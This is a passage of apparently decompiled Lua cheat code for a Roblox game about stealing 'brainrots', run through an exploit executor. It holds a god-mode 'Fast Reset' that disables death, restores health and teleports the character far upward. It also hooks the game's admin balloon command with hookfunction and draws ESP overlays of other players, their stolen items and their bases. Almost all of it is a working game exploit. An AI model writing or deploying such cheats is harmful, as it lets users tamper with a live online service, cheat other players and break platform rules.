				flag220 = value228
			end

			if flag220 and flag219 ~= flag209 then
				return false
			end
			local flag221 = flag204 or humanoidRootPart ~= nil or clone ~= nil

			if flag221 then
				func326()
			end

			return flag221
		end

		tbl1.ResumeIfRequested = function(flag222)
			if flag203 and flag222 == localPlayer.Character then
				func328(flag222, 0.05)
			end
		end

		local connection = localPlayer:GetAttributeChangedSignal("Stealing"):Connect(function()
			func329()
			func318()
		end)

		local connection2 = localPlayer.CharacterRemoving:Connect(function(character_)
			if character_ == localPlayer.Character or character_ == flag209 then
				func326()
			end
		end)

		local connection3 = localPlayer.CharacterAdded:Connect(function(character_)
			if flag209 and flag209 ~= character_ then
				func326()
			end

			if flag203 then
				func328(character_, 0.35)
			end
		end)

		func2(function()
			flag203 = false
			flag205 = false
			flag213 = false
			func326()
			func311(connection)
			func311(connection2)
			func311(connection3)
			tbl1.SuspendForReset = nil
			tbl1.ResumeIfRequested = nil
			tbl1.IsActive = nil
			tbl1.GetDrop = nil
		end)
	end

	do
		local flag223 = true
		local flag224 = false
		local flag225 = true
		local flag226 = false
		local flag227 = false
		local value229 = nil
		local value230 = nil
		local flag228 = false
		local list45 = {}
		local connection = nil
		local chilliFastResetRuntime = CoreGui:FindFirstChild("__ChilliFastResetRuntime")

		if chilliFastResetRuntime then
			local cleanup = chilliFastResetRuntime:FindFirstChild("Cleanup")

			if cleanup and cleanup:IsA("BindableEvent") then
				pcall(function()
					cleanup:Fire()
				end)
			end

			pcall(function()
				chilliFastResetRuntime:Destroy()
			end)
		end

		local folder = Instance.new("Folder")
		folder.Name = "__ChilliFastResetRuntime"
		folder.Archivable = false
		folder.Parent = CoreGui
		local bindableEvent = Instance.new("BindableEvent")
		bindableEvent.Name = "Cleanup"
		bindableEvent.Parent = folder

		local function func330()
			for _, item50 in ipairs(list45) do
				if item50.Connected then
					item50:Disconnect()
				end
			end

			table.clear(list45)
		end

		local function func331()
			return localPlayer:GetAttribute("ChilliDropBrainrotActive") == true
		end

		local function func332(instance45, flag229)
			if not flag223 or flag224 then
				return false
			end
			local humanoid = instance45 and instance45:FindFirstChildOfClass("Humanoid")
			if not instance45 or instance45 ~= localPlayer.Character or not humanoid or not flag229 and humanoid.Health <= 0 then
				return false
			end
			local flag230 = false

			if type(tbl1.SuspendForReset) == "function" then
				local result
				flag230, result = pcall(tbl1.SuspendForReset, instance45)
				flag230 = flag230 and result == true
			end

			local humanoidRootPart2 = instance45:FindFirstChild("HumanoidRootPart")

			if not humanoidRootPart2 then
				if flag230 and type(tbl1.ResumeIfRequested) == "function" then
					tbl1.ResumeIfRequested(instance45)
				end

				return false
			end

			flag224 = true
			local flag231 = instance45

			task.spawn(function()
				local cFrame = humanoidRootPart2.CFrame
				local assemblyLinearVelocity = humanoidRootPart2.AssemblyLinearVelocity
				local assemblyAngularVelocity = humanoidRootPart2.AssemblyAngularVelocity
				local health = humanoid.Health
				local flag232 = true

				pcall(function()
					flag232 = humanoid:GetStateEnabled(Enum.HumanoidStateType.Dead)
					humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, false)

					if humanoid.Health <= 0 then
						humanoid.Health = math.max(humanoid.MaxHealth, 1)
					end
				end)

				local connection2 = humanoid.HealthChanged:Connect(function(health2)
					if flag223 and flag224 and localPlayer.Character == flag231 and health2 <= 0 then
						pcall(function()
							humanoid.Health = math.max(humanoid.MaxHealth, health, 1)
						end)
					end
				end)

				local cFrame2 = cFrame + Vector3.new(0, 31000, 0)

				while flag223 and localPlayer.Character == flag231 do
					if humanoidRootPart2.Parent then
						pcall(function()
							humanoidRootPart2.CFrame = cFrame2
						end)
					end

					if humanoid.Parent and humanoid.Health <= 0 then
						pcall(function()
							humanoid.Health = math.max(humanoid.MaxHealth, health, 1)
						end)
					end

					task.wait()
				end

				local character2 = localPlayer.Character ~= flag231
				connection2:Disconnect()

				if not character2 then
					if humanoidRootPart2.Parent then
						pcall(function()
							humanoidRootPart2.CFrame = cFrame
							humanoidRootPart2.AssemblyLinearVelocity = assemblyLinearVelocity
							humanoidRootPart2.AssemblyAngularVelocity = assemblyAngularVelocity
						end)
					end

					if humanoid.Parent then
						pcall(function()
							humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, flag232)

							if health > 0 and humanoid.Health <= 0 then
								humanoid.Health = health
							end
						end)
					end
				end

				flag224 = false
			end)

			return true
		end

		local function callback4()
			return func332(localPlayer.Character, false)
		end

		local function func333()
			if not flag223 or not flag226 or flag227 then
				return
			end
			flag227 = true

			task.spawn(function()
				for i_ = 1, 20 do
					if not (not flag223 or not flag226 or flag224) then
						if not func332(localPlayer.Character, false) then
							task.wait(0.05)
							continue
						end
					end

					break
				end

				flag227 = false
			end)
		end

		local function func334()
			if flag228 and value229 and value230 and type(hookfunction) == "function" then
				pcall(function()
					hookfunction(value229, value230)
				end)
			end

			flag228 = false
			value229 = nil
			value230 = nil
		end

		local function func335()
			if flag228 then
				return true
			end

			if type(hookfunction) ~= "function" then
				return false
			end

			local ok, result = pcall(function()
				return require(ReplicatedStorage.Datas.AdminCommands.balloon).effects.Victim
			end)

			if not ok or type(result) ~= "function" then
				return false
			end
			value229 = result
			local value231 = nil

			local ok2, result2 = pcall(function()
				return hookfunction(result, function(...)
					local packed3 = table.pack(value231(...))

					if flag223 and flag226 then
						task.defer(func333)
					end

					return table.unpack(packed3, 1, packed3.n)
				end)
			end)

			if not ok2 or type(result2) ~= "function" then
				value229 = nil
				return false
			end
			value231 = result2
			value230 = result2
			flag228 = true
			return true
		end

		local function callback5(flag233)
			flag226 = flag233 == true
			flag227 = false

			if flag226 then
				if not func335() then
					flag226 = false
				end
			else
				func334()
			end
		end

		local function func336(obj71)
			func330()
			if not flag223 or not flag225 or not obj71 then
				return
			end

			task.spawn(function()
				local humanoid = obj71:FindFirstChildOfClass("Humanoid") or obj71:WaitForChild("Humanoid", 5)
				if not flag223 or not flag225 or not humanoid or obj71 ~= localPlayer.Character then
					return
				end
				local flag234 = false
				local flag235 = false

				local function func337()
					local value232 = flag234
					local flag236

					if flag234 then
						flag236 = value232
					else
						flag236 = flag235
					end

					if flag236 or flag224 or obj71 ~= localPlayer.Character or func331() then
						return
					end
					flag235 = true
					local rescueSerial = tbl2.RescueSerial

					task.defer(function()
						flag235 = false
						if flag234 or flag224 or obj71 ~= localPlayer.Character or func331() or not humanoid.Parent then
							return
						end

						if tbl2.ProtectedHumanoid == humanoid and (humanoid.Health > 0 or tbl2.RescueSerial ~= rescueSerial) then
							return
						end

						if humanoid.Health > 0 then
							return
						end
						flag234 = func332(obj71, true) == true
					end)
				end

				list45[#list45 + 1] = humanoid.HealthChanged:Connect(function(health)
					if health <= 0 then
						func337()
					end
				end)

				list45[#list45 + 1] = humanoid.Died:Connect(func337)
			end)
		end

		local function callback6(flag237)
			flag225 = flag237 == true

			if flag225 then
				func336(localPlayer.Character)
			else
				func330()
			end
		end

		local function func338()
			if not flag223 then
				return
			end
			flag223 = false
			flag224 = false
			flag225 = false
			flag226 = false
			flag227 = false
			func330()
			func334()

			if connection then
				connection:Disconnect()
				connection = nil
			end
		end

		connection = localPlayer.CharacterAdded:Connect(function(character_)
			flag224 = false

			if flag225 then
				func336(character_)
			end
		end)

		bindableEvent.Event:Connect(func338)
		folder.Destroying:Connect(func338)
		obj13:CreateButton({ Name = "Fast Reset", ButtonText = "Reset", Callback = callback4 })
		obj13:CreateToggle({ Name = "Auto Fast Reset", Default = true, Callback = callback6 })
		obj13:CreateToggle({ Name = "Auto Reset Balloon", Default = false, Callback = callback5 })
		func336(localPlayer.Character)
	end

	local obj72
	obj72 = esp:CreateSection({ Name = "Player ESP", Expanded = false })
	obj53 = esp:CreateSection({ Name = "Brainrot ESP", Expanded = false })
	obj54 = esp:CreateSection({ Name = "Brainrot Notifications", Expanded = false })
	obj55 = esp:CreateSection({ Name = "Base ESP", Expanded = false })

	func244 = function()
		if type(gethui) == "function" then
			local ok, result = pcall(gethui)
			if ok and typeof(result) == "Instance" then
				return result
			end
		end

		return CoreGui
	end

	func245 = function(name)
		local result23 = func244()
		local tbl54 = {}

		for _, item51 in ipairs({ result23, CoreGui }) do
			if item51 and not tbl54[item51] then
				tbl54[item51] = true
				local obj73 = item51:FindFirstChild(name)

				if obj73 then
					local cleanup = obj73:FindFirstChild("Cleanup")

					if cleanup and cleanup:IsA("BindableEvent") then
						pcall(function()
							cleanup:Fire()
						end)
					end

					pcall(function()
						obj73:Destroy()
					end)
				end
			end
		end

		local screenGui = Instance.new("ScreenGui")
		screenGui.Name = name
		screenGui.Archivable = false
		screenGui.ResetOnSpawn = false
		screenGui.IgnoreGuiInset = true
		screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		screenGui.DisplayOrder = 48
		screenGui.Parent = result23
		local bindableEvent = Instance.new("BindableEvent")
		bindableEvent.Name = "Cleanup"
		bindableEvent.Parent = screenGui
		return screenGui, bindableEvent
	end

	func246 = function(list46)
		for _, item52 in ipairs(list46) do
			if typeof(item52) == "RBXScriptConnection" then
				item52:Disconnect()
			end
		end

		table.clear(list46)
	end

	func247 = function()
		local obj74 = Workspace:FindFirstChild(localPlayer.Name)
		if not obj74 or not obj74:IsA("Model") then
			return nil
		end
		local humanoidRootPart2 = obj74:FindFirstChild("HumanoidRootPart")
		if humanoidRootPart2 and humanoidRootPart2:IsA("BasePart") and humanoidRootPart2.Parent == obj74 then
			return humanoidRootPart2
		end
		local hitbox = obj74:FindFirstChild("__HITBOX") or obj74:FindFirstChild("__hitbox") or obj74:FindFirstChild("Hitbox") or obj74:FindFirstChild("HitBox")
		if hitbox and hitbox:IsA("BasePart") then
			return hitbox
		end
		return nil
	end

	func248 = function(instance46)
		instance46 = instance46 and instance46:FindFirstChild("PlotSign")
		if not instance46 then
			return nil
		end

		for _, descendant in ipairs(instance46:GetDescendants()) do
			if descendant:IsA("TextLabel") then
				local str22 = tostring(descendant.Text or "")
				if str22 ~= "" and string.lower(str22) ~= "your base" and string.find(string.lower(str22), "base", 1, true) then
					return descendant
				end
			end
		end

		return nil
	end

	local func339

	func339 = function(param92)
		local flag238 = func248(param92)

		if flag238 then
			flag238 = tostring(flag238.Text or "")
		end

		flag238 = flag238 or ""
		return flag238 ~= "" and flag238 or "Base"
	end

	func249 = function(param93)
		local lowered7 = string.lower(func339(param93))
		return string.find(lowered7, string.lower(localPlayer.Name), 1, true) ~= nil or string.find(lowered7, string.lower(localPlayer.DisplayName), 1, true) ~= nil
	end

	local func340
	local n8 = 12

	func340 = function(instance47)
		if not instance47 then
			return nil
		end
		local animalPodiums = instance47:FindFirstChild("AnimalPodiums")
		local huge = math.huge
		local n9 = -math.huge
		local n10 = -math.huge
		local huge2 = math.huge
		local huge3 = math.huge

		if animalPodiums then
			for _, child in ipairs(animalPodiums:GetChildren()) do
				local base = child:FindFirstChild("Base")
				base = base and base:FindFirstChild("Spawn")

				if base and base:IsA("BasePart") then
					local position = base.Position
					huge3 = math.min(huge3, position.X)
					n10 = math.max(n10, position.X)
					huge = math.min(huge, position.Z)
					n9 = math.max(n9, position.Z)
					huge2 = math.min(huge2, position.Y)
				end
			end
		end

		local stealHitbox = instance47:FindFirstChild("StealHitbox")
		local x, z

		if stealHitbox and stealHitbox:IsA("BasePart") then
			x = stealHitbox.Position.X
			z = stealHitbox.Position.Z

			if huge2 == math.huge then
				huge2 = stealHitbox.Position.Y - stealHitbox.Size.Y * 0.5
			end
		elseif huge3 ~= math.huge then
			x = (huge3 + n10) * 0.5
			z = (huge + n9) * 0.5
		else
			local mainRoot = instance47:FindFirstChild("MainRoot")
			local isBasePart = mainRoot and mainRoot:IsA("BasePart")
			z = nil
			x = nil

			if isBasePart then
				x = mainRoot.Position.X
				z = mainRoot.Position.Z
				huge2 = mainRoot.Position.Y
			end
		end

		if not x or huge2 == math.huge then
			return nil
		end
		return Vector3.new(x, huge2 + n8, z)
	end

	local func341

	func341 = function(instance48)
		return instance48 and instance48:IsA("BasePart") and (instance48.Name == "PlotSign" or instance48.Name == "MainRoot" or instance48.Name == "Spawn")
	end

	tbl43 = { YourBaseClear = false, ClearBaseTransparency = 0.8 }
	local list47 = {}

	func250 = function(param94)
		list47[#list47 + 1] = param94
	end

	func251 = function(param95, param96)
		if tbl43[param95] == param96 then
			return
		end
		tbl43[param95] = param96

		for _, item53 in ipairs(list47) do
			pcall(item53, param95, param96)
		end
	end

	do
		local value233 = nil

		local ok, result = pcall(function()
			return require(ReplicatedStorage.Datas.Index)
		end)

		if ok and type(result) == "table" then
			value233 = result
		end

		func252 = function(param97)
			local list48 = {}
			local flag239 = value233 and value233[param97]
			if not flag239 then
				return list48
			end

			if type(flag239.BaseColors) == "table" then
				for _, baseColor in pairs(flag239.BaseColors) do
					if typeof(baseColor) == "Color3" then
						list48[#list48 + 1] = baseColor
					end
				end
			end

			if #list48 == 0 and typeof(flag239.MainColor) == "Color3" then
				list48[#list48 + 1] = flag239.MainColor
			end

			return list48
		end
	end

	local n9
	n9 = 5
	local n10
	n10 = 12
	local n11
	n11 = 4.5
	local tbl55
	tbl55 = { "HumanoidRootPart", "LowerTorso", "UpperTorso", "Torso", "Head" }
	local font
	font = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Italic)
	local n12
	n12 = 0.25
	local transparency
	transparency = 0
	local byName3

	byName3 = {
		Head = true,
		Torso = true,
		UpperTorso = true,
		LowerTorso = true,
		["Left Arm"] = true,
		["Right Arm"] = true,
		["Left Leg"] = true,
		["Right Leg"] = true,
		LeftUpperArm = true,
		LeftLowerArm = true,
		LeftHand = true,
		RightUpperArm = true,
		RightLowerArm = true,
		RightHand = true,
		LeftUpperLeg = true,
		LeftLowerLeg = true,
		LeftFoot = true,
		RightUpperLeg = true,
		RightLowerLeg = true,
		RightFoot = true,
	}

	local font2
	font2 = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold, Enum.FontStyle.Normal)
	local value234

	do
		local colorSequence = ColorSequence.new
		local value235 = ColorSequenceKeypoint.new(0, Color3.fromRGB(138, 255, 205))
		local value236 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(125, 225, 255))
		local new = ColorSequenceKeypoint.new
		local color = Color3.fromRGB
		local tbl56 = { value235, value236 }

		do
			local values = table.pack(new(1, color(210, 135, 255)))
			table.move(values, 1, values.n, 3, tbl56)
		end

		value234 = colorSequence(tbl56)
	end

	local colorSequence

	do
		local new = ColorSequenceKeypoint.new
		local color = Color3.fromRGB
		colorSequence = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(7, 73, 66)), new(1, color(35, 17, 79)) })
	end

	local value237

	do
		local colorSequence2 = ColorSequence.new
		local value238 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 105, 105))
		local value239 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 28, 40))
		local new = ColorSequenceKeypoint.new
		local color = Color3.fromRGB
		local tbl57 = { value238, value239 }

		do
			local values = table.pack(new(1, color(184, 0, 18)))
			table.move(values, 1, values.n, 3, tbl57)
		end

		value237 = colorSequence2(tbl57)
	end

	local value240

	do
		local colorSequence2 = ColorSequence.new
		local value241 = ColorSequenceKeypoint.new(0, Color3.fromRGB(124, 0, 15))
		local value242 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(61, 0, 9))
		local new = ColorSequenceKeypoint.new
		local color = Color3.fromRGB
		local tbl58 = { value241, value242 }

		do
			local values = table.pack(new(1, color(18, 0, 3)))
			table.move(values, 1, values.n, 3, tbl58)
		end

		value240 = colorSequence2(tbl58)
	end

	local tbl59

	tbl59 = {
		[""] = 1,
		K = 1000,
		M = 1000000,
		B = 1e9,
		T = 1e12,
		Qa = 1e15,
		Qi = 1e18,
		Sx = 1e21,
		Sp = 1e24,
		Oc = 1e27,
		No = 1e30,
		Dc = 1e33,
	}

	local list49
	list49 = {}
	local tbl60

	tbl60 = {
		Limit = 1000000,
		Fill = Color3.fromRGB(255, 196, 66),
		Outline = Color3.fromRGB(255, 232, 152),
	}

	do
		local colorSequence2 = ColorSequence.new
		local value243 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 231, 158))
		local value244 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 196, 66))
		local new = ColorSequenceKeypoint.new
		local color = Color3.fromRGB
		local tbl61 = { value243, value244 }

		do
			local values = table.pack(new(1, color(214, 142, 12)))
			table.move(values, 1, values.n, 3, tbl61)
		end

		tbl60.Text = colorSequence2(tbl61)
	end

	do
		local colorSequence2 = ColorSequence.new
		local value245 = ColorSequenceKeypoint.new(0, Color3.fromRGB(122, 76, 0))
		local value246 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(62, 38, 0))
		local new = ColorSequenceKeypoint.new
		local color = Color3.fromRGB
		local tbl62 = { value245, value246 }

		do
			local values = table.pack(new(1, color(20, 12, 0)))
			table.move(values, 1, values.n, 3, tbl62)
		end

		tbl60.Stroke = colorSequence2(tbl62)
	end

	do
		local tbl63 = {
			Limit = 10000000,
			Fill = Color3.fromRGB(255, 146, 40),
			Outline = Color3.fromRGB(255, 194, 112),
		}

		local colorSequence2 = ColorSequence.new
		local value247 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 198, 132))
		local value248 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 146, 40))
		local new = ColorSequenceKeypoint.new
		local color = Color3.fromRGB
		local tbl64 = { value247, value248 }

		do
			local values = table.pack(new(1, color(206, 92, 0)))
			table.move(values, 1, values.n, 3, tbl64)
		end

		tbl63.Text = colorSequence2(tbl64)
		local colorSequence3 = ColorSequence.new
		local value249 = ColorSequenceKeypoint.new(0, Color3.fromRGB(112, 50, 0))
		local value250 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(56, 25, 0))
		local new2 = ColorSequenceKeypoint.new
		local color2 = Color3.fromRGB
		local tbl65 = { value249, value250 }

		do
			local values = table.pack(new2(1, color2(18, 8, 0)))
			table.move(values, 1, values.n, 3, tbl65)
		end

		tbl63.Stroke = colorSequence3(tbl65)

		local tbl66 = {
			Limit = 100000000,
			Fill = Color3.fromRGB(255, 82, 38),
			Outline = Color3.fromRGB(255, 140, 96),
		}

		local colorSequence4 = ColorSequence.new
		local value251 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 158, 116))
		local value252 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 82, 38))
		local new3 = ColorSequenceKeypoint.new
		local color3 = Color3.fromRGB
		local tbl67 = { value251, value252 }

		do
			local values = table.pack(new3(1, color3(196, 40, 0)))
			table.move(values, 1, values.n, 3, tbl67)
		end

		tbl66.Text = colorSequence4(tbl67)
		local colorSequence5 = ColorSequence.new
		local value253 = ColorSequenceKeypoint.new(0, Color3.fromRGB(108, 24, 0))
		local value254 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(54, 12, 0))
		local new4 = ColorSequenceKeypoint.new
		local color4 = Color3.fromRGB
		local tbl68 = { value253, value254 }

		do
			local values = table.pack(new4(1, color4(18, 4, 0)))
			table.move(values, 1, values.n, 3, tbl68)
		end

		tbl66.Stroke = colorSequence5(tbl68)

		local tbl69 = {
			Limit = math.huge,
			Fill = Color3.fromRGB(220, 12, 28),
			Outline = Color3.fromRGB(255, 55, 65),
			Text = value237,
			Stroke = value240,
		}

		list49[1] = tbl60
		list49[2] = tbl63
		list49[3] = tbl66
		list49[4] = tbl69
	end

	local func342

	local function func343(text6)
		if type(text6) ~= "string" then
			return nil
		end
		local match, obj75 = text6:match("%$%s*([%d%.]+)%s*(%a*)")
		local num39 = tonumber(match)
		if not num39 then
			return nil
		end

		if obj75 ~= "" then
			obj75 = obj75:sub(1, 1):upper() .. obj75:sub(2):lower()
		end

		return num39 * (tbl59[obj75] or 1)
	end

	func342 = function(param98)
		local flag240 = func343(param98)
		if not flag240 then
			return list49[#list49]
		end

		for _, item54 in ipairs(list49) do
			if flag240 < item54.Limit then
				return item54
			end
		end

		return list49[#list49]
	end

	local screenGui

	do
		local function func344()
			if type(gethui) == "function" then
				local ok, result = pcall(gethui)
				if ok and typeof(result) == "Instance" then
					return result
				end
			end

			return CoreGui
		end

		local result24 = func344()
		local tbl70 = {}

		for _, item55 in ipairs({ result24, CoreGui }) do
			if item55 and not tbl70[item55] then
				tbl70[item55] = true
				local chilliPlayerESPRuntime = item55:FindFirstChild("__ChilliPlayerESPRuntime")

				if chilliPlayerESPRuntime then
					local cleanup = chilliPlayerESPRuntime:FindFirstChild("Cleanup")

					if cleanup and cleanup:IsA("BindableEvent") then
						pcall(function()
							cleanup:Fire()
						end)
					end

					pcall(function()
						chilliPlayerESPRuntime:Destroy()
					end)
				end
			end
		end

		screenGui = Instance.new("ScreenGui")
		screenGui.Name = "__ChilliPlayerESPRuntime"
		screenGui.Archivable = false
		screenGui.ResetOnSpawn = false
		screenGui.IgnoreGuiInset = true
		screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		screenGui.DisplayOrder = 50
		screenGui.Parent = result24
	end

	local bindableEvent
	bindableEvent = Instance.new("BindableEvent")
	bindableEvent.Name = "Cleanup"
	bindableEvent.Parent = screenGui
	local flag241, tbl71, n13, tbl72, list50, n14, func345, func346, func347, func348

	do
		local value255 = screenGui
		flag241 = false

		tbl71 = {
			Name = true,
			Username = false,
			Avatar = true,
			Tool = true,
			Brainrot = true,
			["Admin Panel"] = true,
		}

		n13 = 1
		tbl72 = {}
		list50 = {}
		local tbl73 = {}
		n14 = 0

		func345 = function(list51)
			for _, item56 in ipairs(list51) do
				if item56.Connected then
					item56:Disconnect()
				end
			end

			table.clear(list51)
		end

		func346 = function(param99)
			local nameDisplayHumanoid = param99.NameDisplayHumanoid
			local nameDisplayDistance = param99.NameDisplayDistance

			if nameDisplayHumanoid and nameDisplayHumanoid.Parent and nameDisplayDistance ~= nil then
				pcall(function()
					nameDisplayHumanoid.NameDisplayDistance = nameDisplayDistance
				end)
			end

			param99.NameDisplayHumanoid = nil
			param99.NameDisplayDistance = nil
		end

		func347 = function(param100, nameDisplayHumanoid)
			nameDisplayHumanoid = nameDisplayHumanoid and nameDisplayHumanoid:FindFirstChildOfClass("Humanoid")
			if not nameDisplayHumanoid then
				return
			end

			if param100.NameDisplayHumanoid ~= nameDisplayHumanoid then
				func346(param100)
				param100.NameDisplayHumanoid = nameDisplayHumanoid
				param100.NameDisplayDistance = nameDisplayHumanoid.NameDisplayDistance
			end

			nameDisplayHumanoid.NameDisplayDistance = 0
		end

		local function func349(flag242)
			local str23 = tostring(flag242 or "")
			if str23 == "" then
				return ""
			end

			if str23:match("^%d+$") then
				return "rbxassetid://" .. str23
			end
			return str23
		end

		local function func350(instance49)
			if not instance49 or not instance49:IsA("Tool") then
				return ""
			end
			local textureId = func349(instance49.TextureId)
			if textureId ~= "" then
				return textureId
			end

			for _, item57 in ipairs({ "Icon", "Image", "Thumbnail", "TextureId" }) do
				local attribute = instance49:GetAttribute(item57)
				if type(attribute) ~= "string" then
					continue
				end
				textureId = func349(attribute)
				if textureId ~= "" then
					return textureId
				end
			end

			for _, descendant in ipairs(instance49:GetDescendants()) do
				if descendant:IsA("Decal") or descendant:IsA("Texture") then
					textureId = func349(descendant.Texture)
				elseif descendant:IsA("ImageLabel") or descendant:IsA("ImageButton") then
					textureId = func349(descendant.Image)
				end

				if textureId ~= "" then
					return textureId
				end
			end

			return ""
		end

		local function func351(obj76)
			return obj76 and obj76:FindFirstChildOfClass("Tool") or nil
		end

		func348 = function(instance50, param101)
			for _, item58 in ipairs(tbl55) do
				local obj77 = instance50:FindFirstChild(item58)
				if obj77 and obj77:IsA("BasePart") then
					return obj77
				end
			end

			return param101
		end

		local function func352(part17, part18)
			if part18 == part17 then
				return Vector3.new(0, 3.1, 0)
			end
			local n15 = part17.Position.Y - part18.Position.Y
			if math.abs(n15) <= n11 then
				return Vector3.new(0, math.clamp(n15 + 3.1, 3.8, 6), 0)
			end
			return Vector3.new(0, 4.8, 0)
		end

		local function func353(list52, part19)
			for _, descendant in ipairs(list52:GetDescendants()) do
				if descendant:IsA("Weld") or descendant:IsA("WeldConstraint") then
					local part0 = descendant.Part0
					local part1 = descendant.Part1
					local obj78

					if part0 and not part0:IsDescendantOf(list52) then
						obj78 = part0
					else
						local flag243 = part1 and not part1:IsDescendantOf(list52)
						local value256 = nil
						local value257 = nil

						if flag243 then
							obj78 = part1
							part1 = part0
						else
							obj78 = value256
							part1 = value257
						end
					end

					if obj78 and obj78:IsA("BasePart") and obj78.Parent == Workspace and part1 and part1:IsA("BasePart") and part1:IsDescendantOf(list52) and (obj78.Position - part19.Position).Magnitude <= n9 then
						return obj78, part1
					end
				end
			end

			return nil
		end

		local function func354(text7)
			if type(text7) ~= "string" or not text7:find("/s", 1, true) then
				return false
			end
			local match = text7:match("%$([%d%.]+)")
			local flag244 = match ~= nil

			if flag244 then
				flag244 = (tonumber(match) or 0) > 0
			end

			return flag244
		end

		local function func355(list53, obj79)
			for k, getAttribute in pairs(list53:GetAttributes()) do
				if k ~= "__AssetDescendantCount" and obj79:GetAttribute(k) ~= getAttribute then
					return false
				end
			end

			return true
		end

		local function func356(instance51)
			local generation = instance51:FindFirstChild("Generation", true)
			if generation and generation:IsA("TextLabel") and func354(generation.Text) then
				return generation
			end
			local plots = Workspace:FindFirstChild("Plots")
			local debris = Workspace:FindFirstChild("Debris")
			if not plots or not debris then
				return nil
			end
			local list54 = {}
			local list55 = {}

			for _, child in ipairs(plots:GetChildren()) do
				for _, child2 in ipairs(child:GetChildren()) do
					if child2:IsA("Model") and child2.Name == instance51.Name then
						local position = child2:GetPivot().Position
						list55[#list55 + 1] = position

						if func355(instance51, child2) then
							list54[#list54 + 1] = position
						end
					end
				end
			end

			list54 = #list54 > 0 and list54 or list55
			if #list54 == 0 then
				return nil
			end
			local mutation = instance51:FindFirstChild("Mutation", true)
			local text = mutation and mutation:IsA("TextLabel") and mutation.Text or nil
			local huge = math.huge
			local value258 = nil

			for _, child in ipairs(debris:GetChildren()) do
				if child.Name == "FastOverheadTemplate" and child:IsA("BasePart") then
					local animalOverhead = child:FindFirstChild("AnimalOverhead")
					local displayName = animalOverhead and animalOverhead:FindFirstChild("DisplayName")
					local generation2 = animalOverhead and animalOverhead:FindFirstChild("Generation")
					animalOverhead = animalOverhead and animalOverhead:FindFirstChild("Mutation")

					if displayName and displayName:IsA("TextLabel") and displayName.Text == instance51.Name and generation2 and generation2:IsA("TextLabel") and func354(generation2.Text) then
						local huge2 = math.huge

						for _, item59 in ipairs(list54) do
							huge2 = math.min(huge2, (child.Position - item59).Magnitude)
						end

						local flag245 = text and animalOverhead and animalOverhead:IsA("TextLabel") and animalOverhead.Text ~= text
						local n15 = 0

						if flag245 then
							n15 = 1000
						end

						local n16 = huge2 + n15

						if n16 < huge then
							huge = n16
							value258 = generation2
						end
					end
				end
			end

			return value258
		end

		local function func357(instance52)
			if not instance52 then
				return nil
			end
			local mutation = instance52:FindFirstChild("Mutation", true)
			if mutation and mutation:IsA("TextLabel") then
				return mutation
			end
			return nil
		end

		local function func358(instance53)
			if not (instance53 and instance53.Parent and instance53.Visible) then
				return nil
			end
			local str24 = tostring(instance53.Text or "")
			if str24 == "" then
				return nil
			end

			local tbl74 = {
				Text = str24,
				RichText = instance53.RichText == true,
				Color = instance53.TextColor3,
				Font = instance53.FontFace,
				Gradient = nil,
				StrokeColor = nil,
			}

			local uiStroke = instance53:FindFirstChildOfClass("UIStroke")

			if uiStroke then
				tbl74.StrokeColor = uiStroke.Color
			end

			local uiGradient = instance53:FindFirstChildOfClass("UIGradient")

			if uiGradient then
				tbl74.Gradient = { Color = uiGradient.Color, Rotation = uiGradient.Rotation }
			end

			return tbl74
		end

		local function func359(player7)
			if player7:GetAttribute("Stealing") ~= true then
				return nil
			end
			local character_ = player7.Character
			local humanoidRootPart2 = character_ and character_:FindFirstChild("HumanoidRootPart")
			if not humanoidRootPart2 then
				return nil
			end
			local huge = math.huge
			local value259 = nil

			for _, child in ipairs(Workspace:GetChildren()) do
				if child:IsA("Model") and child ~= character_ and not Players:GetPlayerFromCharacter(child) and child.Name:sub(-6) ~= "_Clone" then
					local rootPart = child:FindFirstChild("RootPart") or child.PrimaryPart or child:FindFirstChildWhichIsA("BasePart")

					if rootPart and rootPart:IsA("BasePart") then
						local flag246, value260 = func353(child, humanoidRootPart2)

						if flag246 and value260 then
							local value261 = humanoidRootPart2.CFrame:PointToObjectSpace(flag246.Position)
							local magnitude = (value260.Position - humanoidRootPart2.Position).Magnitude

							if math.abs(value261.X) <= 4 and value261.Y >= -2 and value261.Y <= 6 and value261.Z >= -6 and value261.Z <= 3 and magnitude <= n10 then
								local n15 = (flag246.Position - humanoidRootPart2.Position).Magnitude + magnitude * 0.05

								if n15 < huge then
									huge = n15
									value259 = child
								end
							end
						end
					end
				end
			end

			if not value259 then
				return nil
			end
			local flag247 = func356(value259)
			return value259.Name, value259, flag247 and flag247.Text or nil, flag247, func357(value259)
		end

		local function func360()
			local currentCamera = Workspace.CurrentCamera
			return math.max(1, math.floor(math.clamp((currentCamera and currentCamera.ViewportSize.Y or 1080) * 0.024, 26, 35) * n13))
		end

		local function func361(text, font3, size)
			local getTextBoundsParams = Instance.new("GetTextBoundsParams")
			getTextBoundsParams.Text = text
			getTextBoundsParams.Font = font3
			getTextBoundsParams.Size = size
			getTextBoundsParams.Width = 1000

			local ok, result = pcall(function()
				return TextService:GetTextBoundsAsync(getTextBoundsParams)
			end)

			getTextBoundsParams:Destroy()
			if ok then
				return result.X
			end
			return (utf8.len(text) or #text) * size * 0.56
		end

		local function func362(param102, color, flag248, param103)
			param102.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
			param102.Color = color
			param102.Enabled = true
